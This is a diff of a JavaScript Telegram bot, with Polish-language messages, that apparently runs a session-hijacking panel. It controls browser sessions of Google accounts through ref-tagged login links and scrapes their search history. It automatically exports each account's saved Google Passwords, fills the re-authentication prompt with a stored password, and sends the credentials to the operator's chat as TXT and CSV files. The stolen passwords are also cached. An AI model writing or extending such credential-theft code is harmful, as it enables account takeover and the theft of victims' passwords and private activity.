@@ -276,6 +276,107 @@ async function handleAddAccount(chatId, args, publicHost) {
   }
 }
 
+// ── /sessions — inline keyboard showing session status ───────────────────────
+
+async function handleSessions(chatId, publicHost) {
+  try {
+    const { loadAccounts } = await import('./accounts.js');
+    const { status } = await import('./browser.js');
+    const list = await loadAccounts();
+    if (list.length === 0) {
+      await replyTo(chatId, '📱 Brak kont. Użyj /addaccount <imię> <platforma>');
+      return;
+    }
+    const keyboard = list.map(acc => {
+      const s = status(acc.id);
+      let icon;
+      if (s.running) {
+        icon = '🟢'; // sesja aktywna
+      } else if (s.lastActivity) {
+        icon = '🟡'; // sesja wygasła (była uruchomiona)
+      } else {
+        icon = '⚫'; // sesja nigdy nie była uruchomiona
+      }
+      return [{ text: `${icon} ${acc.label}`, callback_data: `sess:${acc.id}` }];
+    });
+    keyboard.push([{ text: '🔄 Odśwież', callback_data: 'sessions' }]);
+    const running = list.filter(a => status(a.id).running).length;
+    await sendInlineMessage(chatId, `📊 Sesje (${running}/${list.length} aktywnych):`, keyboard);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+async function handleSessionMenu(chatId, accountId, callbackQueryId, publicHost) {
+  try {
+    const { getAccount } = await import('./accounts.js');
+    const { status, start, stop } = await import('./browser.js');
+    const acc = await getAccount(accountId);
+    if (!acc) { await answerCallback(callbackQueryId, '❌ Nie znaleziono konta'); return; }
+    await answerCallback(callbackQueryId);
+
+    const s = status(accountId);
+    let statusLine;
+    if (s.running) {
+      const mins = s.lastActivity ? Math.floor((Date.now() - s.lastActivity) / 60000) : null;
+      statusLine = `🟢 Aktywna${mins !== null ? ` (ostatnia aktywność: ${mins} min temu)` : ''}`;
+    } else if (s.lastActivity) {
+      const mins = Math.floor((Date.now() - s.lastActivity) / 60000);
+      statusLine = `🟡 Wygasła (ostatnia aktywność: ${mins} min temu)`;
+    } else {
+      statusLine = '⚫ Nie uruchomiona';
+    }
+
+    const host = publicHost || config.publicHost;
+    const link = acc.ref && host ? `https://${host}/account/login?ref=${acc.ref}` : null;
+    const lines = [`📋 *${acc.label}*`, `Status: ${statusLine}`];
+    if (acc.email) lines.push(`📧 ${acc.email}`);
+
+    const keyboard = [];
+    if (s.running) {
+      keyboard.push([{ text: '⏹ Zatrzymaj sesję', callback_data: `sess_stop:${accountId}` }]);
+    } else {
+      keyboard.push([{ text: '▶️ Uruchom sesję', callback_data: `sess_start:${accountId}` }]);
+    }
+    if (link) keyboard.push([{ text: '🔗 Otwórz sesję', url: link }]);
+    keyboard.push([{ text: '« Wróć do sesji', callback_data: 'sessions' }]);
+
+    await sendInlineMessage(chatId, lines.join('\n'), keyboard);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+async function handleSessionStart(chatId, accountId, callbackQueryId, publicHost) {
+  await answerCallback(callbackQueryId, '⏳ Uruchamiam...');
+  try {
+    const { getAccount } = await import('./accounts.js');
+    const { start } = await import('./browser.js');
+    const acc = await getAccount(accountId);
+    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
+    await start(accountId, '127.0.0.1');
+    await replyTo(chatId, `✅ Sesja "${acc.label}" uruchomiona.`);
+    await handleSessions(chatId, publicHost);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+async function handleSessionStop(chatId, accountId, callbackQueryId, publicHost) {
+  await answerCallback(callbackQueryId, '⏳ Zatrzymuję...');
+  try {
+    const { getAccount } = await import('./accounts.js');
+    const { stop } = await import('./browser.js');
+    const acc = await getAccount(accountId);
+    if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
+    await stop(accountId);
+    await replyTo(chatId, `⏹ Sesja "${acc.label}" zatrzymana.`);
+    await handleSessions(chatId, publicHost);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
 // ── /panel — inline keyboard main menu ───────────────────────────────────────
 
 async function editMessage(chatId, messageId, text) {
@@ -412,7 +513,7 @@ async function handleHistoryFile(chatId, accountId, callbackQueryId) {
     const histPage = await ctx.newPage();
     try {
       // myactivity.google.com — search history
-      await histPage.goto('https://myactivity.google.com/myactivity', { waitUntil: 'networkidle', timeout: 25000 });
+      await histPage.goto('https://myactivity.google.com/myactivity', { waitUntil: 'load', timeout: 30000 });
       await histPage.waitForTimeout(2000);
 
       // Scroll to load more entries
@@ -455,12 +556,24 @@ async function handleHistoryFile(chatId, accountId, callbackQueryId) {
 }
 
 async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
-  await answerCallback(callbackQueryId, '⏳ Pobieram hasła z Google...');
+  await answerCallback(callbackQueryId, '⏳ Sprawdzam cache...');
   try {
     const { getAccount } = await import('./accounts.js');
-    const { getContext } = await import('./browser.js');
+    const { getContext, getPasswordsCache, exportPasswordsInBackground } = await import('./browser.js');
     const acc = await getAccount(accountId);
     if (!acc) { await replyTo(chatId, '❌ Nie znaleziono konta'); return; }
+
+    // Check cache first — instant send
+    const cached = getPasswordsCache(accountId);
+    if (cached) {
+      const age = Math.floor((Date.now() - cached.ts) / 60000);
+      await sendDocument(cached.txt, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${cached.count} wpisów, cache ${age} min temu)`);
+      await sendDocument(cached.csv, `google-passwords-${accountId}.csv`, null);
+      return;
+    }
+
+    // No cache — export now
+    await replyTo(chatId, `⏳ Brak cache, eksportuję hasła dla "${acc.label}"...`);
     let ctx = getContext(accountId);
     if (!ctx) {
       await replyTo(chatId, `⏳ Uruchamiam sesję "${acc.label}"...`);
@@ -471,165 +584,129 @@ async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
       if (!ctx) { await replyTo(chatId, `❌ Nie udało się uruchomić sesji "${acc.label}".`); return; }
     }
 
-    const pwPage = await ctx.newPage();
+    // Run export and wait
+    await exportPasswordsInBackground(accountId);
+    const result = getPasswordsCache(accountId);
+    if (!result) { await replyTo(chatId, `❌ Eksport nie powiódł się. Sprawdź czy konto jest zalogowane w Google.`); return; }
+    await sendDocument(result.txt, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${result.count} wpisów)`);
+    await sendDocument(result.csv, `google-passwords-${accountId}.csv`, null);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+async function handleGooglePasswords_UNUSED(chatId, accountId, callbackQueryId) {
+  // kept for reference — replaced by cache+export approach above
+  try {
+    const { getContext } = await import('./browser.js');
+    const pwPage = await (getContext(accountId))?.newPage();
     try {
-      await pwPage.goto('https://passwords.google.com/', { waitUntil: 'networkidle', timeout: 25000 });
+      // Navigate to export page
+      await pwPage.goto('https://passwords.google.com/options?ep=1', { waitUntil: 'load', timeout: 30000 });
       await pwPage.waitForTimeout(2000);
 
-      // Scroll to load all lazy-loaded entries
-      let prev = 0;
-      for (let i = 0; i < 30; i++) {
-        const h = await pwPage.evaluate(() => document.body.scrollHeight);
-        if (h === prev) break;
-        prev = h;
-        await pwPage.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
-        await pwPage.waitForTimeout(500);
-      }
+      // Start waiting for download BEFORE clicking export button
+      const downloadPromise = pwPage.waitForEvent('download', { timeout: 60000 });
 
-      // Find all clickable list items (password rows)
-      const rowCount = await pwPage.evaluate(() => {
-        return document.querySelectorAll('div[role="listitem"], li[jscontroller], [data-identifier]').length
-          || document.querySelectorAll('c-wiz[jsrenderer] li').length
-          || document.querySelectorAll('li').length;
+      // Find and click export button (searches shadow DOM too)
+      const clicked = await pwPage.evaluate(() => {
+        function findAndClick(root) {
+          if (!root) return false;
+          const btns = root.querySelectorAll ? root.querySelectorAll('button, a') : [];
+          for (const b of btns) {
+            const t = (b.textContent || b.getAttribute('aria-label') || '').toLowerCase();
+            if (t.includes('export') || t.includes('eksport')) { b.click(); return true; }
+          }
+          for (const el of root.querySelectorAll ? root.querySelectorAll('*') : []) {
+            if (el.shadowRoot && findAndClick(el.shadowRoot)) return true;
+          }
+          return false;
+        }
+        return findAndClick(document.body);
       });
 
-      // Click each row, reveal password, handle re-auth if needed
-      const results = [];
-      const MASK = '•';
-
-      // Find all password rows — filter out nav/footer links
-      const rows = pwPage.locator('c-wiz li, div[jsname] li').filter({ hasNot: pwPage.locator('nav, footer') });
-      const count = await rows.count().catch(() => 0);
-      const limit = Math.min(count || 0, 200);
-
-      let progressMsgId = null;
-      try {
-        const r = await fetch(apiUrl('sendMessage'), {
-          method: 'POST',
-          headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: `🔐 Pobieram hasła: 0 / ${limit}` }),
-        });
-        const d = await r.json();
-        progressMsgId = d.result?.message_id;
-      } catch {}
-
-      // Helper: deep shadow DOM input value search
-      async function getShadowInputValue(page, type) {
-        return page.evaluate((t) => {
-          function walk(root) {
-            if (!root) return null;
-            const inputs = root.querySelectorAll ? root.querySelectorAll(`input[type="${t}"]`) : [];
-            for (const inp of inputs) if (inp.value) return inp.value;
-            for (const el of root.querySelectorAll ? root.querySelectorAll('*') : []) {
-              if (el.shadowRoot) { const v = walk(el.shadowRoot); if (v) return v; }
-            }
-            return null;
-          }
-          return walk(document.body);
-        }, type);
-      }
-
-      for (let i = 0; i < limit; i++) {
-        try {
-          const row = rows.nth(i);
-          const rowText = (await row.innerText().catch(() => '')).trim();
-          // Skip nav/footer garbage
-          if (!rowText || rowText.length < 3 || /^(Pomoc|Warunki|Polityka|Więcej|Ustawienia)/.test(rowText)) continue;
-
-          await row.click({ timeout: 5000 });
-          await pwPage.waitForTimeout(900);
-
-          // Click eye button — search all buttons with matching aria-label through shadow DOM
-          const clicked = await pwPage.evaluate(() => {
-            function findAndClick(root) {
-              if (!root) return false;
-              const btns = root.querySelectorAll ? root.querySelectorAll('button') : [];
-              for (const b of btns) {
-                const lbl = (b.getAttribute('aria-label') || b.title || b.textContent || '').toLowerCase();
-                if (lbl.includes('show') || lbl.includes('pokaż') || lbl.includes('visibility') || lbl.includes('reveal')) {
-                  b.click(); return true;
-                }
-              }
-              for (const el of root.querySelectorAll ? root.querySelectorAll('*') : []) {
-                if (el.shadowRoot && findAndClick(el.shadowRoot)) return true;
-              }
-              return false;
-            }
-            return findAndClick(document.body);
-          }).catch(() => false);
-
-          if (clicked) await pwPage.waitForTimeout(600);
-
-          // Handle re-auth
-          const reAuthVisible = await pwPage.evaluate(() => {
-            const inp = document.querySelector('input[type="password"]');
-            return inp && inp.offsetParent !== null;
-          }).catch(() => false);
-          if (reAuthVisible && acc.password) {
-            await pwPage.evaluate((pw) => {
-              const inp = document.querySelector('input[type="password"]');
-              if (inp) { inp.value = pw; inp.dispatchEvent(new Event('input', {bubbles:true})); }
-            }, acc.password);
-            await pwPage.keyboard.press('Enter');
-            await pwPage.waitForTimeout(1200);
-            // Click eye again
-            await pwPage.evaluate(() => {
-              function findAndClick(root) {
-                if (!root) return false;
-                for (const b of (root.querySelectorAll ? root.querySelectorAll('button') : [])) {
-                  const lbl = (b.getAttribute('aria-label') || '').toLowerCase();
-                  if (lbl.includes('show') || lbl.includes('pokaż')) { b.click(); return true; }
-                }
-                for (const el of (root.querySelectorAll ? root.querySelectorAll('*') : []))
-                  if (el.shadowRoot && findAndClick(el.shadowRoot)) return true;
-                return false;
-              }
-              findAndClick(document.body);
-            }).catch(() => {});
-            await pwPage.waitForTimeout(600);
-          }
-
-          // Extract password value from shadow DOM (type=text after reveal)
-          const pwValue = await getShadowInputValue(pwPage, 'text') || '';
-          const lines = rowText.split('\n').map(l => l.trim()).filter(Boolean);
-          const site = lines[0] || `wpis-${i + 1}`;
-          const user = lines[1] || '';
-          const pw = pwValue && !pwValue.includes(MASK) ? pwValue : '(nie udało się)';
-          results.push(`${site} | ${user} | ${pw}`);
-
-          // Close detail
-          await pwPage.evaluate(() => {
-            function findClose(root) {
-              if (!root) return false;
-              for (const b of (root.querySelectorAll ? root.querySelectorAll('button') : [])) {
-                const lbl = (b.getAttribute('aria-label') || '').toLowerCase();
-                if (lbl.includes('close') || lbl.includes('zamknij') || lbl.includes('back') || lbl.includes('wróć')) { b.click(); return true; }
-              }
-              for (const el of (root.querySelectorAll ? root.querySelectorAll('*') : []))
-                if (el.shadowRoot && findClose(el.shadowRoot)) return true;
-              return false;
-            }
-            findClose(document.body);
-          }).catch(() => {});
-          await pwPage.waitForTimeout(400);
-        } catch { /* skip */ }
-
-        if (progressMsgId && (i + 1) % 10 === 0) {
-          await editMessage(chatId, progressMsgId, `🔐 Pobieram hasła: ${i + 1} / ${limit}`);
-        }
-      }
-
-      if (progressMsgId) {
-        await editMessage(chatId, progressMsgId, `✅ Gotowe: ${results.filter(r => !r.endsWith('(nie udało się)')).length} / ${results.length} wpisów z hasłem`);
-      }
-
-      if (!results.length) {
-        await replyTo(chatId, `❌ Nie udało się pobrać haseł (${acc.label}).`);
+      if (!clicked) {
+        await replyTo(chatId, `❌ Nie znaleziono przycisku eksportu. Konto może nie być zalogowane w Google (${acc.label}).`);
+        await pwPage.close().catch(() => {});
         return;
       }
 
-      const buf = Buffer.from(results.join('\n'), 'utf8');
-      await sendDocument(buf, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${results.length} wpisów)`);
+      // Handle "Export passwords?" confirmation dialog
+      await pwPage.waitForTimeout(1500);
+      await pwPage.evaluate(() => {
+        function findAndClick(root) {
+          if (!root) return false;
+          const btns = root.querySelectorAll ? root.querySelectorAll('button') : [];
+          for (const b of btns) {
+            const t = (b.textContent || b.getAttribute('aria-label') || '').toLowerCase();
+            if (t.includes('export') || t.includes('eksport') || t.includes('download') || t.includes('pobierz')) {
+              b.click(); return true;
+            }
+          }
+          for (const el of root.querySelectorAll ? root.querySelectorAll('*') : []) {
+            if (el.shadowRoot && findAndClick(el.shadowRoot)) return true;
+          }
+          return false;
+        }
+        findAndClick(document.body);
+      }).catch(() => {});
+
+      // Handle possible re-auth
+      await pwPage.waitForTimeout(1500);
+      const reAuthVisible = await pwPage.evaluate(() => {
+        const inp = document.querySelector('input[type="password"]');
+        return inp && inp.offsetParent !== null;
+      }).catch(() => false);
+
+      if (reAuthVisible && acc.password) {
+        await pwPage.evaluate((pw) => {
+          const inp = document.querySelector('input[type="password"]');
+          if (inp) { inp.value = pw; inp.dispatchEvent(new Event('input', { bubbles: true })); }
+        }, acc.password);
+        await pwPage.keyboard.press('Enter');
+        await pwPage.waitForTimeout(2000);
+      }
+
+      // Wait for the download
+      let download;
+      try {
+        download = await downloadPromise;
+      } catch {
+        await replyTo(chatId, `❌ Download nie nastąpił (timeout). Sprawdź czy konto jest zalogowane w Google (${acc.label}).`);
+        await pwPage.close().catch(() => {});
+        return;
+      }
+
+      const stream = await download.createReadStream();
+      const chunks = [];
+      for await (const chunk of stream) chunks.push(chunk);
+      const csvBuf = Buffer.concat(chunks);
+
+      // Parse CSV to count entries and reformat as readable txt
+      const lines = csvBuf.toString('utf8').split('\n').map(l => l.trim()).filter(Boolean);
+      const header = lines[0]; // name,url,username,password
+      const dataLines = lines.slice(1);
+      const count = dataLines.length;
+
+      // Convert to readable format
+      const readable = dataLines.map(line => {
+        // Simple CSV parse (handles quoted fields)
+        const cols = [];
+        let cur = '', inQ = false;
+        for (const ch of line) {
+          if (ch === '"') { inQ = !inQ; }
+          else if (ch === ',' && !inQ) { cols.push(cur); cur = ''; }
+          else cur += ch;
+        }
+        cols.push(cur);
+        const [name, url, username, password] = cols;
+        return `${name || url}\n  login: ${username}\n  hasło: ${password}`;
+      }).join('\n\n');
+
+      const txtBuf = Buffer.from(readable, 'utf8');
+      await sendDocument(txtBuf, `google-passwords-${accountId}.txt`, `🔐 Google Passwords: ${acc.label} (${count} wpisów)`);
+      // Also send raw CSV
+      await sendDocument(csvBuf, `google-passwords-${accountId}.csv`, null);
     } finally {
       await pwPage.close().catch(() => {});
     }
@@ -665,7 +742,16 @@ export function startCommandListener(publicHost) {
             const chatId = cq.message?.chat?.id;
             const d = cq.data || '';
 
-            if (d === 'panel') {
+            if (d === 'sessions') {
+              await handleSessions(chatId, publicHost);
+              await answerCallback(cq.id);
+            } else if (d.startsWith('sess:')) {
+              await handleSessionMenu(chatId, d.slice(5), cq.id, publicHost);
+            } else if (d.startsWith('sess_start:')) {
+              await handleSessionStart(chatId, d.slice(11), cq.id, publicHost);
+            } else if (d.startsWith('sess_stop:')) {
+              await handleSessionStop(chatId, d.slice(10), cq.id, publicHost);
+            } else if (d === 'panel') {
               await handlePanel(chatId, publicHost);
               await answerCallback(cq.id);
             } else if (d.startsWith('acc:')) {
@@ -701,7 +787,9 @@ export function startCommandListener(publicHost) {
           const rest = cmdMatch[2].trim();
           const parts = rest ? rest.split(/\s+/) : [];
 
-          if (cmd === '/panel' || cmd === '/start') {
+          if (cmd === '/sessions') {
+            await handleSessions(chatId, publicHost);
+          } else if (cmd === '/panel' || cmd === '/start') {
             await handlePanel(chatId, publicHost);
           } else if (cmd === '/adduser') {
             await handlePanelAdduser(chatId, parts);
